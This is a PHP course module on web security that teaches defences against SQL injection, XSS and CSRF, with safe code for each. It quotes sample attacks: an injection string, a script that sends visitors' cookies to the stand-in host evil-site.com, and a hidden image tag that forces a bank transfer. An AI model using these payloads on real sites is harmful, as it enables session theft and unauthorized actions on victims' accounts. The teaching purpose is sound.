# 02.6 — Web Security Fundamentals

> **Status:** ✅ Available

## 🎯 Objectives

- Understand and prevent SQL injection.
- Understand and prevent XSS (Cross-Site Scripting) flaws.
- Understand and prevent CSRF (Cross-Site Request Forgery) flaws.
- Know other basic security reflexes (headers, validation, secrets).

## 📋 Prerequisites

[02.5 — Sessions, Cookies, Homemade Authentication](../05-sessions-cookies-authentification-maison/README.en.md)

## ⏱️ Estimated duration

2h.

## 📖 Theory

> ⚠️ This module is one of the most important in the entire training. Security is not an option added at the end of a project: it must be built in from the design stage. Every concept covered here will be referenced again every time it applies in later levels.

### 1. SQL Injection

SQL injection occurs when user data is inserted **directly** into a SQL query without protection, letting an attacker alter the query itself.

```php
<?php
// ❌ DANGEROUS: NEVER do this
$email = $_POST['email']; // an attacker enters: ' OR '1'='1
$query = "SELECT * FROM users WHERE email = '$email'";
// The query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
// This condition is ALWAYS true: the attacker retrieves ALL users,
// and could even log in without knowing any password.
```

**The solution: prepared statements**, covered in detail in [module 02.8 — PDO](../08-pdo-bases-de-donnees-mysql/README.md).

```php
<?php
// ✅ SAFE: the data is passed separately from the query, never concatenated
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $email]);
// Whatever $email contains, it's always treated as a PLAIN VALUE,
// never as executable SQL code.
```

> ⚠️ **Absolute rule: never build a SQL query by concatenating strings with user data.** Always use prepared statements, no exceptions, even in a small "just for testing" project.

### 2. XSS (Cross-Site Scripting)

Already covered in [module 01.7](../../01-php-fondamentaux/07-formulaires-http-get-post/README.en.md): an XSS flaw occurs when user data is redisplayed as HTML **without being escaped**, allowing malicious scripts to run in other users' browsers.

```php
<?php
// ❌ DANGEROUS
echo "<p>Comment: " . $_POST['comment'] . "</p>";
// If $comment = "<script>document.location='http://evil-site.com/steal?cookie='+document.cookie</script>"
// this script runs for EVERY visitor who sees this comment, and can steal
// their session cookies (thus potentially impersonating them).

// ✅ SAFE
echo "<p>Comment: " . htmlspecialchars($_POST['comment']) . "</p>";
```

There are two main families of XSS:

- **Reflected XSS**: the malicious script is in the URL or a parameter, immediately echoed back by the page (e.g., a search result displayed without escaping).
- **Stored XSS**: the malicious script is saved in the database (e.g., a comment), and runs for **every** visitor who views the page — the more dangerous of the two.

> 📌 Rule: **any** data coming from a user (form, URL, database populated by users) must go through `htmlspecialchars()` before being displayed as HTML.

### 3. CSRF (Cross-Site Request Forgery)

A CSRF flaw lets a malicious site trigger an action without the user's knowledge, by exploiting the fact that they're already logged in (via their session cookies) on your site.

**Attack example**: you're logged in on `bank.example.com`. You visit a malicious site that contains:
```html
<img src="https://bank.example.com/transfer.php?amount=1000&to=attacker" style="display:none">
```
Your browser automatically sends your session cookies to `bank.example.com` along with this request — the transfer could go through without you doing anything intentional.

**The solution: a CSRF token**, unique per session, included in every form and verified on submission.

```php
<?php
// Generating the token (once per session)
session_start();
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>
<form method="POST" action="transfer.php">
    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
    <!-- ... other fields ... -->
</form>
```

```php
<?php
// Server-side verification, before processing the action
session_start();

$receivedToken = $_POST['csrf_token'] ?? '';

if (!hash_equals($_SESSION['csrf_token'] ?? '', $receivedToken)) {
    http_response_code(403);
    exit("Invalid request (incorrect CSRF token).");
}

// The request is legitimate: the action can be processed with confidence.
```

> 📌 `hash_equals()` compares two strings in **constant time**, which prevents a "timing attack" where an attacker would gradually deduce the correct token by measuring the response time of a plain comparison (`===`). Laravel generates and verifies this token automatically (`@csrf` in Blade views, covered in [level 06](../../06-laravel-fondamentaux/README.md)).

### 4. Other essential security reflexes

- **Never trust user data**, even data coming from `hidden` fields or `select` elements: an attacker can send any value directly, bypassing your form entirely.
- **Validating and escaping are two different things**: validating checks that data is correct *before* processing; escaping (`htmlspecialchars`) protects the display *after* processing. Both are necessary.
- **Never store secrets in version-controlled source code** (database passwords, API keys): use environment variables (`.env`, covered in depth in [level 05](../../05-outils-professionnels/README.md) and native to Laravel).
- **Limit the error information displayed in production**: a detailed error message (file path, SQL query) is a goldmine for an attacker.

## ✅ Key takeaways

- SQL injection → always prepared statements, never concatenate user data into SQL.
- XSS → always `htmlspecialchars()` before displaying user data as HTML.
- CSRF → a unique per-session token, verified with `hash_equals()` on every sensitive action.
- These three reflexes must become automatic, in **every** project in this training, even the smallest ones.

## ➡️ Going further

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — the world reference for the most common web security flaws
- [php.net/manual/en/pdo.prepared-statements.php](https://www.php.net/manual/en/pdo.prepared-statements.php)

## 📝 Exercises

See [EXERCICES.md](EXERCICES.en.md).

---

**Previous:** [02.5 — Sessions, Cookies, Homemade Authentication](../05-sessions-cookies-authentification-maison/README.en.md) · **Next:** [02.7 — Composer, Autoloading, PSR](../07-composer-autoload-psr/README.md) *(French only)*
